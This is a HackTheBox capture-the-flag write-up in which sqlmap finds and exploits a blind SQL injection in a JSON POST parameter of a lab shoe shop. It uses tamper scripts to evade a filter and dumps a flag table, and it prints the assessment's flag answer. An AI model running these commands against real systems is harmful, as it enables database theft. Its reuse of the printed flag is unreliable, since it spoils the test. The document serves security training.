# SQLMap Skills Assessment — Write-Up

> **Module**: SQLMap Essentials — HackTheBox
> **Goal**: Test a web application, find the SQLi vulnerability with SQLMap, and exploit it to extract the `final_flag`
> **Final flag**: `HTB{n07_50_h4rd_r16h7?!}`

---

## Objective

For this assessment we're given a web application to test. The task is to identify the SQL injection vulnerability using SQLMap and inject the right parameters until we retrieve the `final_flag`.

---

## 1. Reconnaissance — the web application

Opening the web application lands us on the homepage: it's a shoe e-commerce site (**Minishop**).

<img width="1918" height="882" alt="homewebapp" src="https://github.com/user-attachments/assets/c70477e9-7914-4c60-90a5-dd72f0555de0" />


I started by intercepting a few requests with **Burp Suite** during normal browsing, but got nothing interesting — until I clicked **"BUY NOW"** on a product in the shop section.

---

## 2. Finding the injection point — the POST request

Clicking "BUY NOW" generates a **POST request** to `/action.php` with an interesting JSON body:

<img width="783" height="862" alt="postrequest" src="https://github.com/user-attachments/assets/e44cf400-5413-4292-a287-72637ddcbdbb" />

```http
POST /action.php HTTP/1.1
Host: 154.57.164.77:31840
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Content-Type: application/json
Content-Length: 8
Origin: http://154.57.164.77:31840
Referer: http://154.57.164.77:31840/shop.html

{
    "id":1
}
```

The `id` parameter inside the JSON body is the perfect injection candidate. I copied the full request and saved it to a `req.txt` file to feed it to SQLMap.

> 💡 Saving the full request to a file and using `-r` is the right choice with JSON bodies: passing JSON via `--data` is error-prone, whereas with `-r` SQLMap preserves the headers and format and automatically detects the JSON parameter to test.

---

## 3. First attempt — empty extraction

I tried a basic scan:

```bash
sqlmap -r req.txt --batch
```

The injection appeared to succeed (SQLMap flagged the JSON `id` parameter as vulnerable to **time-based blind**), but the moment I asked it to extract information I only got **empty responses**. Something was blocking data extraction — time to investigate the cause.

---

## 4. Debug — understanding why it fails

To see what was happening I re-ran the scan with increased verbosity:

```bash
sqlmap -r req.txt -v 3 --batch
```

With `-v 3` I could see the exact payloads SQLMap was sending. The tool was using **time-based blind** payloads (`SLEEP` + binary search) to extract data character by character, but these were being **filtered/blocked by the server** — which is why extraction returned empty responses.

> 💡 `-v 3` is the key verbosity level in an assessment: it shows the actual `[PAYLOAD]` entries, letting you tell whether they're reaching the target or being blocked beforehand. Without this visibility, the empty extraction would have stayed a mystery.

---

## 5. The fix — tamper scripts

Server-side blocking is typical of a filter/WAF that recognizes payload patterns. To bypass it I added **tamper scripts**, which transform the shape of the payloads while keeping the SQL logic intact:

```bash
sqlmap -r req.txt -v 3 --tamper=between,randomcase --current-db --batch
```

| Tamper | What it does |
|--------|--------------|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #` and `=` with `BETWEEN # AND #`, evading filters on comparison operators |
| `randomcase` | Randomizes keyword casing (`SELECT` → `SeLeCt`), bypassing the filter's case-sensitive matching |

With the tampers active, SQLMap is finally able to extract data. We confirm the current database: we're in **`production`**.

---

## 6. Enumeration — the tables of `production`

Let's list the tables of the `production` database:

```bash
sqlmap -r req.txt -D production --tables --tamper=between,randomcase --batch
```
<img width="1555" height="847" alt="retrieving_tables" src="https://github.com/user-attachments/assets/951abb46-4b94-465c-a1bd-87571df0db17" />

SQLMap returns 5 tables:

```
+-------------+
| brands      |
| categories  |
| final_flag  |
| order_items |
| products    |
+-------------+
```

The `final_flag` table is clearly our target.

---

## 7. Extracting the flag

Let's dump the contents of the `final_flag` table:

```bash
sqlmap -r req.txt -D production -T final_flag --tamper=between,randomcase --batch --dump
```
<img width="1918" height="826" alt="flag" src="https://github.com/user-attachments/assets/e4d28948-a3d6-4155-afea-1e763d8b28cd" />

Flag obtained!

---

